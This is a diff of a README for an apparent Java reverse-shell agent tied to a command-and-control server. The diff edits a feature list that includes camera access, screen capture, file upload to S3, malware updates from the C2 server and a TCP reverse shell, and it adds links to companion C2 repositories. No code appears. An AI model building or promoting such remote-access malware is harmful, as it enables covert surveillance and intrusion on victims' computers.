@@ -6,9 +6,10 @@ This Java project implements a reverse shell that connects to a command and cont
 
 - Upload Files to S3 bucket
 - Play rick roll on target computer
-- Access camera 
-- Harvest Credentials
-- Update Malware
+- Access camera
+- Screen Capture
+- Update Malware From C2 Server
+- Spawn a TCP Reverse Shell
 
 ## Table of Contents
 
@@ -71,8 +72,8 @@ Implement additional security measures as needed for your specific use case.
 
 [C2 UI](https://github.com/The-Hustler-Hattab/c2-ui)  
 [C2 Server](https://github.com/The-Hustler-Hattab/C2JavaServer)   
-[C2 Agent](https://github.com/The-Hustler-Hattab/ReverseShellWebSocketAgent)
-
+[C2 JAVA Agent](https://github.com/The-Hustler-Hattab/ReverseShellWebSocketAgent)  
+[C2 C# .NET Agent (RECOMMENDED)](https://github.com/The-Hustler-Hattab/WebSocketReverseShellDotNet)
 
 ## Contributing
 Contributions are welcome! 
